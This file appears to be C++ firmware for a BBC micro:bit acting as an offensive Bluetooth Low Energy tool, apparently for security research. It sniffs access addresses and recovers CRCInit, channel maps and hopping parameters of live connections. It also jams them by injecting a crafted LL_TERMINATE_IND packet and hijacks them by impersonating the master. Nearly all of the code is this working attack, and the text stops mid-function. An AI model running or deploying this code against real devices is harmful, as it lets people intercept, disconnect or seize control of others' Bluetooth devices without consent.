#include "MicroBit.h"
#include "nrf_delay.h"
#include "helpers.h"
#include "sequence.h"
#include "link.h"
#include "radio.h"
#include "timer.h"

#define VERSION_MAJOR   0x01
#define VERSION_MINOR   0x01

#define MAX_QUEUE_LEN   10
#define PKT_SIZE        10  /* Access Address + 2 bytes PDU + CRC */
#define MAX_PACKETS     10  /* 10 packets max. */
#define IRQ_PRIORITY_HIGH 1
#define DRIFT           2
#define HIJACK_SUCCESS  0
#define HIJACK_ERROR    1
#define HIJACK_MAX_TRIES_BEFORE_FAILURE 300

#define DIVIDE_ROUND(N, D) ((N) + (D)/2) / (D)

#define B(x) ((uint8_t *)x)

MicroBit uBit;
static Link *pLink;

/**
 * BLE Sniffer action.
 **/

typedef enum {
    IDLE,

    /* States for active connection sniffing. */
    SNIFF_AA,
    RECOVER_CHM,
    RECOVER_CRC,
    RECOVER_HOPINC,
    RECOVER_HOPINTER,
    //FOLLOW,

    /* States for connection request sniffing. */
    SNIFF_CONNECT_REQ,
    SYNC_CONNECT,
    //FOLLOW_CONNECT,

    /* States for attacks. */
    //JAM_IDLE,
    JAM_RX,
    JAM_TX,
    HIJACK_TX,
    HIJACK_RX,

    /* Collaborative Channel map recovery. */
    CCHM
} current_action_t;

typedef struct tSnifferState {
    current_action_t action;

    /* Access address sniffing. */
    uint32_t access_address;
    uint32_t candidates_aa[MAX_QUEUE_LEN];
    uint8_t count_aa[MAX_QUEUE_LEN];
    uint8_t n_aa;
    uint32_t crcinit;
    uint16_t hop_interval;
    bool interval_provided;
    uint32_t hop_increment;
    uint8_t n;
    uint64_t smallest_interval;
    uint64_t prev_time;
    uint32_t observed_interval;
    uint16_t pkt_count;
    uint8_t channel;

    /* Connection request sync. */
    uint8_t bd_address[6];

    /* Connection parameters update. */
    bool expect_cp_update;
    uint16_t cp_update_hop_interval;
    uint16_t cp_update_instant;

    /* Channel map */
    uint8_t channels_mapped;
    uint8_t chm[37];
    bool chm_provided;
    uint32_t max_interval;
    uint32_t last_measure;

    /* Channel map update. */
    uint8_t chm_update[37];
    uint16_t chm_update_instant;
    bool expect_chm_update;

    /* Connection event. */
    uint16_t conn_evt_counter;
    uint16_t conn_evt_pkt_counter;
    uint16_t conn_evt_counter_update;
    uint16_t conn_lost_packets;
    uint16_t conn_transmit_window;
    uint32_t max_lost_packets_allowed;

    /* sequence numbers. */
    uint8_t sn;
    uint8_t nesn;

    /* Packet direction: 0=master->slave, 1=slave->master */
    uint8_t direction;

    /* Jamming */
    bool jamming;
    bool hijacking;
    bool hijacked;
    Ticker hj_ticker;
    int16_t hj_timer;
    uint16_t hj_tries;
    bool send_pkt;
    bool pkt_sent;

    /* Collaborative Channel mapping */
    uint8_t cchm_start;
    uint8_t cchm_stop;

    bool measuring;
    bool synced;
    Ticker ticker;
    SequenceGenerator sg;
} sniffer_state_t;

static sniffer_state_t g_sniffer;
//static uint8_t hexbuf[23];
static uint32_t measures;
static uint32_t hops;
uint8_t rx_buffer[254];                     /* Rx buffer used by RF to store packets. */
uint8_t tx_buffer[254];                     /* Tx buffer used by RF to send packets. */

/* Packet injection buffer. */
uint8_t packet[254];

static void recover_crc(uint32_t access_address);
static void recover_hop_interval(void);
static void recover_chm();
static void recover_chm_next();
static void recover_cchm_next();
static void recover_hop_inc(void);
static void follow_connection(void);
static void sync_connection(void);
static void reset(void);
static void set_timer_for_next_anchor(uint16_t interval);
static void sync_lost_track(void);
static void hijack_hop_channel(void);
static void hijack_prepare_packet(void);

void map_channel(int channel)
{
    if ((channel >= 0) && (channel <=37))
        g_sniffer.chm[channel] = 1;
}

uint8_t is_channel_mapped(int channel)
{
    return (g_sniffer.chm[channel] == 1);
}

uint8_t find_first_channel()
{
    int i;
    for (i=0;i<37;i++)
        if (g_sniffer.chm[i] > 0)
            return i;
    return 0xff;
}

uint8_t count_channels()
{
    uint8_t channels = 0;
    int i;

    for (i=0;i<37;i++)
        if (g_sniffer.chm[i] > 0)
            channels++;

    return channels;
}

void hop_tick()
{
    measures++;
}

void hj_sync()
{
  hops++;
}

#if 0
static void next_channel_tick()
{
  /* TODO: maybe use the same code as sync_hop_channel, I mean listen on a channel
  a bit earlier and wait for master's packet to synchronize rather than relying
  on microbit's timers... */

  /* If no packet, check if we need to apply a chm update. */
  if (g_sniffer.conn_evt_pkt_counter == 0)
    sync_lost_track();

  /* Compute next channel. */
  g_sniffer.channel = g_sniffer.sg.getNextChannel();
  g_sniffer.conn_evt_pkt_counter = 0;

  /* TODO: use radio_set_channel_fast() instead of raw code here. */

  /* Go listening on the new channel. */
  NVIC_DisableIRQ(RADIO_IRQn);
  NRF_RADIO->EVENTS_DISABLED = 0;
  NRF_RADIO->TASKS_DISABLE = 1;
  while (NRF_RADIO->EVENTS_DISABLED == 0);

  NRF_RADIO->FREQUENCY = channel_to_freq(g_sniffer.channel);
  NRF_RADIO->DATAWHITEIV = g_sniffer.channel;

  NVIC_ClearPendingIRQ(RADIO_IRQn);
  NVIC_EnableIRQ(RADIO_IRQn);

  // enable receiver
  NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk;

  // enable receiver (once enabled, it will listen)
  NRF_RADIO->EVENTS_READY = 0;
  NRF_RADIO->EVENTS_END = 0;
  NRF_RADIO->TASKS_RXEN = 1;
}
#endif

#if 0
static void start_connection_follow()
{
    g_sniffer.ticker.detach();
    g_sniffer.ticker.attach_us(next_channel_tick, 1250*g_sniffer.hop_interval);

    /* Reset connection event counters. */
    g_sniffer.conn_evt_pkt_counter = 0;
    g_sniffer.conn_evt_counter = 0;

    /* Compute next channel. */
    g_sniffer.channel = g_sniffer.sg.getNextChannel();
    radio_set_channel_fast(g_sniffer.channel);
}
#endif

static void start_hijack()
{
  //pLink->verbose(B("JH"));

  /* Disable timers. */
  g_sniffer.ticker.detach();

  g_sniffer.hijacked = false;
  g_sniffer.hj_tries = 0;

  /* Change RADIO IRQ priority to high. */
  radio_disable();
  NVIC_SetPriority(RADIO_IRQn, IRQ_PRIORITY_HIGH);

  /* nRF51 Series Reference Manual v2.1, section 6.1.1, page 18
	 * PCN-083 rev.1.1
	 *
	 * Fine tune BLE deviation parameters.
	 */
	if ((NRF_FICR->OVERRIDEEN & FICR_OVERRIDEEN_BLE_1MBIT_Msk)
					== (FICR_OVERRIDEEN_BLE_1MBIT_Override
					<< FICR_OVERRIDEEN_BLE_1MBIT_Pos)) {
		NRF_RADIO->OVERRIDE0 = NRF_FICR->BLE_1MBIT[0];
		NRF_RADIO->OVERRIDE1 = NRF_FICR->BLE_1MBIT[1];
		NRF_RADIO->OVERRIDE2 = NRF_FICR->BLE_1MBIT[2];
		NRF_RADIO->OVERRIDE3 = NRF_FICR->BLE_1MBIT[3];
		NRF_RADIO->OVERRIDE4 = NRF_FICR->BLE_1MBIT[4] | 0x80000000;
	}

  /* Compute next channel. */
  g_sniffer.channel = g_sniffer.sg.getNextChannel();

  /* Prepare empty PDU. */
  tx_buffer[0] = 0x01 | (g_sniffer.nesn << 2) | (g_sniffer.sn << 3);
  tx_buffer[1] = 0x00;

  /* Let's start hijacking. */
  g_sniffer.action = HIJACK_TX;

  /* Send buffer. */
  radio_send_rx(tx_buffer, 2, g_sniffer.channel);

  /* Next anchor is at hopInterval*1250 - delta. */
  #if 0
  g_sniffer.ticker.attach_us(
    hijack_hop_channel,
    g_sniffer.hop_interval*1250
  );
  #endif
  g_sniffer.hj_timer = timer_create(TIMER_REPEATED);
  timer_start(g_sniffer.hj_timer, g_sniffer.hop_interval*1250, hijack_hop_channel);
}


int seen_aa(uint32_t aa)
{
    int i,j;
    int change;
    uint32_t z;
    uint8_t x;

    /* Look for this access address in our list. */
    for (i=0; i<g_sniffer.n_aa; i++)
    {
        if (g_sniffer.candidates_aa[i] == aa)
        {
            /* We found our AA, update count. */
            if (g_sniffer.count_aa[i] < 5)
                g_sniffer.count_aa[i]++;
            return g_sniffer.count_aa[i];
        }
    }

    /* Not found, we need to add it to our list. */
    /* First, we check if there is an empty slot. */
    if (g_sniffer.n_aa < MAX_QUEUE_LEN) {
        g_sniffer.candidates_aa[g_sniffer.n_aa] = aa;
        g_sniffer.count_aa[g_sniffer.n_aa] = 1;
        g_sniffer.n_aa++;
        return 1;
    } else {
        /* If not, we sort our list, remove half the values and add our AA. */
        do
        {
            change = 0;
            for (i=0; i<(g_sniffer.n_aa-1); i++)
            {
                for (j=i+1; j<g_sniffer.n_aa; j++)
                {
                    if (g_sniffer.count_aa[i] < g_sniffer.count_aa[j])
                    {
                        x = g_sniffer.count_aa[i];
                        g_sniffer.count_aa[i] = g_sniffer.count_aa[j];
                        g_sniffer.count_aa[j] = x;
                        z = g_sniffer.candidates_aa[i];
                        g_sniffer.candidates_aa[i] = g_sniffer.candidates_aa[j];
                        g_sniffer.candidates_aa[j] = z;
                        change = 1;
                    }
                }
            }
        } while (change > 0);

        /* Remove half the values. */
        g_sniffer.n_aa /= 2;

        /* Insert our AA. */
        g_sniffer.candidates_aa[g_sniffer.n_aa] = aa;
        g_sniffer.count_aa[g_sniffer.n_aa] = 1;
        g_sniffer.n_aa++;

        return 1;
    }
}


/**
 * nRF51822 RADIO handler.
 *
 * This handler is called whenever a RADIO event occurs (IRQ).
 **/

extern "C" void RADIO_IRQHandler(void)
{
    uint32_t aa,crc_rev, crc;
    uint64_t inter, curtime;
    uint8_t candidate_pdu[2];
    int i,j;

    if (NRF_RADIO->EVENTS_READY) {
        NRF_RADIO->EVENTS_READY = 0;
        NRF_RADIO->TASKS_START = 1;
    }

    if (NRF_RADIO->EVENTS_END) {
        NRF_RADIO->EVENTS_END = 0;

        switch(g_sniffer.action)
        {
          case SNIFF_AA:
            {
              g_sniffer.pkt_count++;

              /* Dewhiten bytes 4 and 5. */
              candidate_pdu[0] = rx_buffer[4];
              candidate_pdu[1] = rx_buffer[5];
              dewhiten(candidate_pdu, 2, g_sniffer.channel);
              if (((candidate_pdu[0] & 0xF3) == 1) && (candidate_pdu[1] == 0))
              {
                  /* Check AA */
                  aa = rx_buffer[0] | rx_buffer[1]<<8 | rx_buffer[2]<<16 | rx_buffer[3]<<24;
                  if (seen_aa(aa) > 1) {
                      /* We may have a candidate AA. */
                      pLink->notifyAccessAddress(aa, g_sniffer.channel, NRF_RADIO->RSSISAMPLE);
                  }
              }
              else
              {
                /* Shit right by one bit once and twice */
                for (j=0; j<2; j++)
                {
                  /* Shift right. */
                  for (i=0; i<9; i++)
                    rx_buffer[i] = rx_buffer[i]>>1 | ((rx_buffer[i+1]&0x01) << 7);

                  /* Dewhiten candidate PDU. */
                  candidate_pdu[0] = rx_buffer[4];
                  candidate_pdu[1] = rx_buffer[5];
                  dewhiten(candidate_pdu, 2, g_sniffer.channel);

                  /* Check if PDU is the one expected. */
                  if (((candidate_pdu[0] & 0xF3) == 1) && (candidate_pdu[1] == 0))
                  {
                      aa = rx_buffer[0] | rx_buffer[1]<<8 | rx_buffer[2]<<16 | rx_buffer[3]<<24;
                      if (seen_aa(aa) > 1) {
                          /* We may have a candidate AA. */
                          pLink->notifyAccessAddress(aa, g_sniffer.channel, NRF_RADIO->RSSISAMPLE);
                      }
                  }
                }
              }
              if (g_sniffer.pkt_count > 100)
              {
                  g_sniffer.channel = (g_sniffer.channel + 1)%37;
                  radio_set_sniff(g_sniffer.channel);
                  g_sniffer.pkt_count = 0;
              }

              /* Continue to receive. */
              NRF_RADIO->TASKS_START = 1;
            }
            break;

          case RECOVER_CRC:
            {
              /* Extract crc and recover CRCInit */
              if (((rx_buffer[0]&0xF3) == 1) && (rx_buffer[1]==0))
              {
                  crc = rx_buffer[2] | rx_buffer[3]<<8 | rx_buffer[4]<<16;
                  crc_rev = btle_reverse_crc(crc, rx_buffer, 2);
                  if (crc_rev != g_sniffer.crcinit)
                  {
                      g_sniffer.crcinit = crc_rev;
                      g_sniffer.n = 0;

                      if (measures > g_sniffer.max_interval)
                        g_sniffer.max_interval = measures;
                      measures = 0;
                  }
                  else
                  {
                      if (g_sniffer.n > 5)
                      {
                          g_sniffer.max_interval = (g_sniffer.max_interval * 3)/2;

                          /* Notify CRC. */
                          pLink->notifyCrc(
                            g_sniffer.access_address,
                            g_sniffer.crcinit
                          );
#if 0
                          if (!g_sniffer.chm_provided)
                            recover_chm();
                          else if (!g_sniffer.interval_provided)
                            recover_hop_interval();
                          else
                            recover_hop_inc();
#endif
                      }
                      else
                      {
                        if (measures > g_sniffer.max_interval)
                          g_sniffer.max_interval = measures;
                        measures = 0;
                        g_sniffer.n++;
                      }
                  }
              }

              /* Change channel if chm is not provided. */
              if ((!g_sniffer.chm_provided) && (measures >= 3200))
              {
                /* Reset measures. */
                measures = 0;

                /* Switch to next channel. */
                g_sniffer.channel = (g_sniffer.channel + 1)%37;
                radio_sniff_aa(g_sniffer.access_address, g_sniffer.channel);
              }

              /* Continue to receive. */
              NRF_RADIO->TASKS_START = 1;
            }
            break;

          case RECOVER_CHM:
            {
              if ((NRF_RADIO->CRCSTATUS == 1)) {
                /* If by any chance we got a channel map update. */
                if (((rx_buffer[0]&0x03) == 0x03) && (rx_buffer[2] == 0x01))
                    pLink->verbose(B("U"));

                if (!is_channel_mapped(g_sniffer.channel))
                {
                    map_channel(g_sniffer.channel);
                    pLink->verbose(B("I"));
                    recover_chm_next();
                }
              }

              /* Continue to receive. */
              NRF_RADIO->TASKS_START = 1;
            }
            break;

          case CCHM:
            {
              if ((NRF_RADIO->CRCSTATUS == 1)) {
                /* If by any chance we got a channel map update. */
                if (((rx_buffer[0]&0x03) == 0x03) && (rx_buffer[2] == 0x01))
                    pLink->verbose(B("U"));

                /* Map channel if not already mapped. */
                if (!is_channel_mapped(g_sniffer.channel))
                {
                    map_channel(g_sniffer.channel);
                    recover_cchm_next();
                }
              }

              /* Continue to receive. */
              NRF_RADIO->TASKS_START = 1;
            }
            break;


          case RECOVER_HOPINTER:
            {
              /* We expect a correct CRC for this packet. */
              if ((NRF_RADIO->CRCSTATUS == 1)) {
                  /* If we were not measuring, then start our counting timer. */
                  if (g_sniffer.measuring == false)
                  {
                      measures = 0;
                      g_sniffer.prev_time = 0;
                      g_sniffer.measuring = true;
                      g_sniffer.ticker.attach_us(hop_tick, 1250);

                      /* Compute interval. */
                      pLink->verbose(B("Recovering hop interval ..."));
                  }
                  else
                  {
                      /* compute interval based on measures. */
                      curtime = measures;
                      inter = (curtime - g_sniffer.prev_time);
                      if (inter > 2)
                      {
                          g_sniffer.prev_time = curtime;
                          if ((inter/37) != (g_sniffer.observed_interval/37))
                          {
                              g_sniffer.observed_interval = inter;
                              g_sniffer.n = 0;

                              /* Compute interval. */
                              //snprintf((char *)hexbuf, 20, (char *)"inter: %08x", (uint32_t)inter);
                              //pLink->verbose(hexbuf);

                          } else {
                              g_sniffer.n++;
                              if (g_sniffer.n >= 2) /* was 5 */
                              {
                                  /* Done with hop interval, then recover hop increment. */
                                  g_sniffer.hop_interval = inter/37;

                                  pLink->notifyHopInterval(
                                    g_sniffer.access_address,
                                    (uint16_t)g_sniffer.hop_interval
                                  );

                                  recover_hop_inc();
                              }
                          }

                      }
                  }
              }

              /* Continue to receive. */
              NRF_RADIO->TASKS_START = 1;
            }
            break;

          case RECOVER_HOPINC:
            {
              /* We expect a correct CRC for this packet. */
              if ((NRF_RADIO->CRCSTATUS == 1)) {
                  /* If we were not measuring, then start our counting timer. */
                  if (g_sniffer.measuring == false)
                  {
                      measures = 0;
                      g_sniffer.measuring = true;
                      g_sniffer.ticker.attach_us(hop_tick, 1250);

                  }
                  else if (g_sniffer.channel == g_sniffer.sg.getFirstChannel())
                  {
                      /* First packet receive. */
                      g_sniffer.observed_interval = measures;

                      /* Jump to second channel. */
                      g_sniffer.channel = g_sniffer.sg.getSecondChannel();
                      radio_follow_aa(g_sniffer.access_address, g_sniffer.channel, g_sniffer.crcinit);
                  } else if (g_sniffer.channel == g_sniffer.sg.getSecondChannel())
                  {
                      /* Second packet received, deduce hop increment. */
                      inter = DIVIDE_ROUND((measures - g_sniffer.observed_interval), g_sniffer.hop_interval);
                      g_sniffer.hop_increment = g_sniffer.sg.getHopIncrement(inter);

                      if (g_sniffer.hop_increment != 0)
                      {
                        g_sniffer.sg.setHopIncrement(g_sniffer.hop_increment);
                        pLink->notifyHopIncrement(g_sniffer.access_address, g_sniffer.hop_increment);

                        /* We don't know the transmit window size and offset, assume it is the same as hop interval. */
                        g_sniffer.conn_transmit_window = g_sniffer.hop_interval;

                        /* Follow connection. */
                        follow_connection();
                      }
                      else
                      {
                        /* Restart measure. */
                        g_sniffer.measuring = false;
                        g_sniffer.ticker.detach();
                      }
                  }
              }

              /* Continue to receive. */
              NRF_RADIO->TASKS_START = 1;
            }
            break;

          case SNIFF_CONNECT_REQ:
            {
              /* Sniff connection request for a given BD address */
              if ((NRF_RADIO->CRCSTATUS == 1))
              {
                /**
                * Sniff CONN_REQ packet structure is the following:
                *
                *   +00: 0xC5 (TxAdd=1, RxAdd=1)
                *    +01: 0x22 (payload length)
                *    +02: InitA
                *    +08: AdvA
                *    +0E: Access Address
                *    +12: CRCInit
                *    +15: WinSize
                *    +16: WinOffset
                *    +18: Interval
                *    +1A: Latency
                *    +1C: Timeout
                *    +1E: Channel Map
                *    +23: Hop & SCA
                **/

                /* CRC is correct, is it a CONNECT_REQ packet ? */
                if ((rx_buffer[0] & 0x0F) == 0x05) /* 0x05 for connect request */
                {
                  uint32_t *aa;

                  /**
                   * Does BD address matches the one we're looking for, or should
                   * we accept any BD address ?
                   */
                  if (
                      (
                        (rx_buffer[0x08] == g_sniffer.bd_address[0]) &&
                        (rx_buffer[0x09] == g_sniffer.bd_address[1]) &&
                        (rx_buffer[0x0A] == g_sniffer.bd_address[2]) &&
                        (rx_buffer[0x0B] == g_sniffer.bd_address[3]) &&
                        (rx_buffer[0x0C] == g_sniffer.bd_address[4]) &&
                        (rx_buffer[0x0D] == g_sniffer.bd_address[5])
                      ) || (
                        (0xFF == g_sniffer.bd_address[0]) &&
                        (0xFF == g_sniffer.bd_address[1]) &&
                        (0xFF == g_sniffer.bd_address[2]) &&
                        (0xFF == g_sniffer.bd_address[3]) &&
                        (0xFF == g_sniffer.bd_address[4]) &&
                        (0xFF == g_sniffer.bd_address[5])
                      )
                    )
                  {

                    /* Extract access address. */
                    aa = (uint32_t *)&rx_buffer[0x0E];
                    g_sniffer.access_address = *aa;

                    /* Extract CRCInit */
                    g_sniffer.crcinit = (rx_buffer[0x12] | (rx_buffer[0x13] << 8) | (rx_buffer[0x14] << 16));

                    /* Extract hop interval */
                    g_sniffer.hop_interval = (rx_buffer[0x18] | (rx_buffer[0x19] << 8));

                    /* Extract hop increment */
                    g_sniffer.hop_increment = (rx_buffer[0x23] & 0x1F);

                    /* Compute transmit window */
                    g_sniffer.conn_transmit_window = (rx_buffer[0x15] + (rx_buffer[0x16] | rx_buffer[0x17] << 8));

                    chm_to_array(&rx_buffer[0x1E], g_sniffer.chm);

                    /* Synchronize with master. */
                    sync_connection();

                    /* Report CONNECT_REQ packet. */
                    pLink->notifyConnectionPacket(rx_buffer, (int)rx_buffer[1] + 2);
                  }
                }
              }

              /* Continue to receive. */
              NRF_RADIO->TASKS_START = 1;
            }
            break;

          case SYNC_CONNECT:
            {
              /* CRC must be correct. */
              if ((NRF_RADIO->CRCSTATUS == 1))
              {
                /* Update connection event packet counter. */
                g_sniffer.conn_evt_pkt_counter++;

                /* Do we need to update connection parameters ? */
                #if 0
                if (g_sniffer.expect_cp_update && (g_sniffer.cp_update_instant == g_sniffer.conn_evt_counter))
                {
                    pLink->verbose(B("UHI"));
                    /* Update hop interval. */
                    g_sniffer.hop_interval = g_sniffer.cp_update_hop_interval;

                    /* Update done. */
                    g_sniffer.expect_cp_update = false;
                }
                #endif

                /* Are we already synchronized ? */
                if (g_sniffer.synced == false)
                {
                  /* We got a valid packet, consider sniffer synchronized with the
                     master. This is an anchor point, we set up a timer to change
                     channel for the next anchor point. */
                  set_timer_for_next_anchor((g_sniffer.hop_interval - 1)*1250);
                  g_sniffer.synced = true;

                  /* If jamming is enabled, prepare buffer, disable rx and switch on tx. */
                  if (g_sniffer.jamming)
                  {
                    /* Prepare buffer. */
                    #if 0
                    for (i=0; i<128; i++)
                      tx_buffer[i]=0x55;
                    tx_buffer[0] = 0x0f; /* LLID: 0x01, NESN: 0x01, SN: 0x01, MD: 0x00 */
                    tx_buffer[1] = 126; /* packet length: 62 bytes */
                    #endif

                    /**
                     Inject an LL_TERMINATE_IND packet.

                     We inject a carefully crafted packet with correct SN & NESN
                     values, based on what we observed.
                    **/
                    #if 1
                    //tx_buffer[0] = 0x03 | (g_sniffer.sn << 2) | (g_sniffer.nesn << 3);
                    tx_buffer[0] = 0x03 | (g_sniffer.nesn << 3) | (((g_sniffer.sn==0)?1:0) << 2);
                    tx_buffer[1] = 0x02;
                    tx_buffer[2] = 0x02;
                    tx_buffer[3] = 0x13;
                    #endif

                    /* We are jamming :) */
                    g_sniffer.action = JAM_TX;

                    /* Switch radio to TX and start sending. We don't need to enforce T_IFS as it
                       is roughly BTLE T_IFS (138 rather than 150). */
                    radio_send(tx_buffer, 4);
                  }
                }

                /* Update SN & NESN from master point of view (used for hijacking) */
                if (g_sniffer.direction == 0)
                {
                  g_sniffer.nesn = (rx_buffer[0] & 0x04) >> 2;
                  g_sniffer.sn = (rx_buffer[0] & 0x08) >> 3;
                }

                /* Forward packets to link. */
                if (rx_buffer[1] > 0)
                {
                  /* Is it a LL_CONNECTION_UPDATE_REQ ? */
                  if (((rx_buffer[0]&0x03) == 0x03) && (rx_buffer[2] == 0x00))
                  {
                    /* Yep, keep in memory the new hop interval and the instant. */
                    g_sniffer.cp_update_hop_interval  = (rx_buffer[0x06] | (rx_buffer[0x07] << 8));
                    g_sniffer.cp_update_instant = (rx_buffer[0x0C] | (rx_buffer[0x0D] << 8));

                    /* Ask for update at the given instant. */
                    g_sniffer.expect_cp_update = true;
                  }

                  /* Is it a LL_CHANNEL_MAP_REQ ? */
                  if (((rx_buffer[0]&0x03) == 0x03) && (rx_buffer[2] == 0x01))
                  {
                    /* Yep, keep in memory the new channel map ... */
                    chm_to_array(&rx_buffer[3], g_sniffer.chm_update);

                    /* ... and the target instant. */
                    g_sniffer.chm_update_instant = (rx_buffer[0x08] | (rx_buffer[0x09] << 8));

                    /* Ask for update at the given instant. */
                    g_sniffer.expect_chm_update = true;
                  }

                  /* Report LL data, header included. */
                  //pLink->notifyBlePacket(rx_buffer, (int)rx_buffer[1] + 2);
                  pLink->notifyNordicTapBlePacket(
                    rx_buffer,
                    (int)rx_buffer[1] + 2,
                    g_sniffer.channel,
                    0,
                    g_sniffer.direction,
                    0,
                    g_sniffer.conn_evt_counter
                  );
                }

                /* Update direction. */
                g_sniffer.direction = (g_sniffer.direction + 1) % 2;
              }

              /* Continue to receive. */
              NRF_RADIO->TASKS_START = 1;
            }
            break;


          /* JAM_TX packet sent, reconfigure RADIO to listen. */
          case JAM_TX:
            {
              //pLink->verbose(B("JTX"));

              /* Packet was sent, switch packet pointer back to rx_buffer */
              NRF_RADIO->PACKETPTR = (uint32_t)rx_buffer;
              NRF_RADIO->TXPOWER = (RADIO_TXPOWER_TXPOWER_0dBm << RADIO_TXPOWER_TXPOWER_Pos);

              /* Continue to follow target the way we usually do. */
              g_sniffer.action = SYNC_CONNECT;

              /* Reconfigure radio (RX on current channel with associate access address). */
              radio_follow_conn(
                g_sniffer.access_address,
                g_sniffer.channel,
                g_sniffer.crcinit
              );
            }
            break;

          /* HIJACK_TX packet sent, RADIO will automatically switch to RX. */
          case HIJACK_TX:
            {
              //pLink->verbose(B("HTX"));

              /* Master->slave packet sent, switch from tx to rx. */
              g_sniffer.action = HIJACK_RX;

              /* Count number of tries to detect a failure. */
              if (!g_sniffer.hijacked)
                g_sniffer.hj_tries++;

              /* Packet was sent, switch packet pointer back to rx_buffer */
              NRF_RADIO->PACKETPTR = (uint32_t)rx_buffer;
            }
            break;


          /* HIJACK_RX received packet, continue to listen (default). */
          case HIJACK_RX:
            {
              uint8_t sn, nesn, md;

              if ((NRF_RADIO->CRCSTATUS == 1))
              {
                /* Mark connection as hijacked if required. */
                if (!g_sniffer.hijacked)
                {
                  g_sniffer.hijacked = true;

                  /* Notify successful hijacking. */
                  pLink->notifyHijackStatus(HIJACK_SUCCESS);
                }

                /* We got a packet ! */
                md = (rx_buffer[0] & 0x10) >> 4;
                sn = (rx_buffer[0] & 0x08) >> 3;
                nesn = (rx_buffer[0] & 0x04) >> 2;


                /* Update SN & NESN from master point of view (used for hijacking) */
                if (g_sniffer.nesn == sn) {
                  /* Slave ack received data from master. */
                  g_sniffer.nesn = (g_sniffer.nesn + 1) % 2;

                  /* If we have sent a non-empty PDU, mark it sent. */
                  if (g_sniffer.pkt_sent)
                  {
                    g_sniffer.send_pkt = false;
                    g_sniffer.pkt_sent = false;
                  }
                }
                if (g_sniffer.sn != nesn) {
                  /* Master ack received data from slave. */
                  g_sniffer.sn = (g_sniffer.sn + 1) % 2;
                }

                /* Notify received packet if not an empty-PDU. */
                if (rx_buffer[1] > 0)
                {
                  pLink->notifyNordicTapBlePacket(
                    rx_buffer,
                    (int)rx_buffer[1] + 2,
                    g_sniffer.channel,
                    0,
                    /*g_sniffer.direction*/1, /* from slave, obviously :) */
                    0,
                    g_sniffer.conn_evt_counter
                  );
                }

                /* Is there more data ? */
                #if 0
                if (md == 1)
                {
                  /* Change state to HIJACK_TX */
                  g_sniffer.action = HIJACK_TX;

                  /* We need to prepare the next packet and send it. */
                  hijack_prepare_packet();
                  radio_send_rx(tx_buffer, 2, g_sniffer.channel);
                }
                #endif
              }
            }
            break;

          /* Do nothing by default or when idling. */
          case IDLE:
          default:
            break;
        }
    }
}


/**
 * Initialize sniffer state.
 **/

static void reset(void)
{
  /* Currently doing nothing =). */
  g_sniffer.action = IDLE;

  /* Reset BLE parameters. */
  g_sniffer.access_address = 0x0;
  g_sniffer.n_aa = 0;
  g_sniffer.crcinit = 0;
  g_sniffer.hop_interval = 0;
  g_sniffer.interval_provided = false;
  g_sniffer.hop_increment = 0;
  g_sniffer.smallest_interval = 0L;
  g_sniffer.prev_time = 0L;
  g_sniffer.observed_interval = 0;
  g_sniffer.pkt_count = 0;
  g_sniffer.max_lost_packets_allowed = 0;

  /* Reset channel map. */
  for (int i=0; i<37; i++)
    g_sniffer.chm[i] = 0;
  g_sniffer.chm_provided = false;

  g_sniffer.measuring = false;
  g_sniffer.synced = false;

  g_sniffer.expect_chm_update = false;
  g_sniffer.expect_cp_update = false;

  g_sniffer.conn_lost_packets = 0;
  g_sniffer.conn_transmit_window = 0;
  g_sniffer.conn_evt_counter = 0;

  /* Reset timers. */
  g_sniffer.ticker.detach();
  g_sniffer.hj_ticker.detach();

  if (g_sniffer.hj_timer >= 0)
    timer_destroy(g_sniffer.hj_timer);
  g_sniffer.hj_timer = -1;

  /* Reset jamming. */
  g_sniffer.jamming = false;

  /* Reset hijacking. */
  g_sniffer.hijacking = false;
  g_sniffer.hijacked = false;
  g_sniffer.sn = 0;
  g_sniffer.nesn = 0;
  g_sniffer.direction = 0;
  g_sniffer.send_pkt = false;
  g_sniffer.pkt_sent = false;
}

static void start_scanning(void)
{
    /* Sniffer is idling. */
    g_sniffer.action = SNIFF_AA;

    /* No access address candidates. */
    g_sniffer.n_aa = 0;
    g_sniffer.pkt_count = 0;
    g_sniffer.channel = 1;

    /* Start sniffing BLE packets on channel 1. */
    radio_set_sniff(g_sniffer.channel);
}

static void recover_crcinit(uint32_t accessAddress)
{
  g_sniffer.pkt_count = 0;

  recover_crc(accessAddress);
}

static void recover_hop(uint32_t accessAddress, uint32_t crcinit, uint8_t *chm)
{
  /* Convert 5-byte chm into 37-byte array. */
  chm_to_array(chm, g_sniffer.chm);

  /* Set access address. */
  g_sniffer.access_address = accessAddress;

  /* Set CRCInit value. */
  g_sniffer.crcinit = crcinit;

  /* First recover hop interval. */
  recover_hop_interval();
}

static void recover_connection_parameters(uint32_t accessAddress)
{
  g_sniffer.pkt_count = 0;

  recover_crc(accessAddress);
}

static void recover_connection_parameters(uint32_t accessAddress, uint8_t *chm)
{
  /* Convert 5-byte chm into 37-byte array. */
  chm_to_array(chm, g_sniffer.chm);

  /* Channel map is provided. */
  g_sniffer.chm_provided = true;

  /* Start CRC recovery. */
  g_sniffer.pkt_count = 0;
  recover_crc(accessAddress);
}

static void recover_connection_parameters(uint32_t accessAddress, uint8_t *chm, uint16_t hopInterval)
{
  /* Convert 5-byte chm into 37-byte array. */
  chm_to_array(chm, g_sniffer.chm);

  /* Channel map is provided. */
  g_sniffer.chm_provided = true;

  /* Initialize sequence generator. */
  g_sniffer.sg.initialize(g_sniffer.chm);

  /* Set hop interval. */
  g_sniffer.hop_interval = hopInterval;
  g_sniffer.interval_provided = true;

  /* Start CRC recovery. */
  g_sniffer.pkt_count = 0;
  recover_crc(accessAddress);
}

/**
 * Configure radio to sniff CONNECT_REQ packets on an advertising channel.
 **/

static void sniff_conn_req(uint8_t adv_channel)
{
  /* Start connect_req sniffing. */
  g_sniffer.action = SNIFF_CONNECT_REQ;

  /* Configure radio to receive packets on advertisement channels. */
  radio_follow_conn(0x8E89BED6, adv_channel, 0x555555);
}

/**
 * sync_connection()
 *
 * Synchronize the sniffer with an existing connection as defined in g_sniffer.
 **/

static void sync_connection(void)
{
  int channel;

  /**
   * Determine supervision timeout in number of packets.
   * max_lost_packets_allowed = (2000ms / time spent on each channel in ms)
   **/
  g_sniffer.max_lost_packets_allowed = 2000 / (g_sniffer.hop_interval * 1.25);

  /* Reset connection update parameters. */
  g_sniffer.cp_update_instant = 0;
  g_sniffer.cp_update_hop_interval = 0;
  g_sniffer.expect_cp_update = false;

  g_sniffer.expect_chm_update = false;

  /* Initialize sequence generator. */
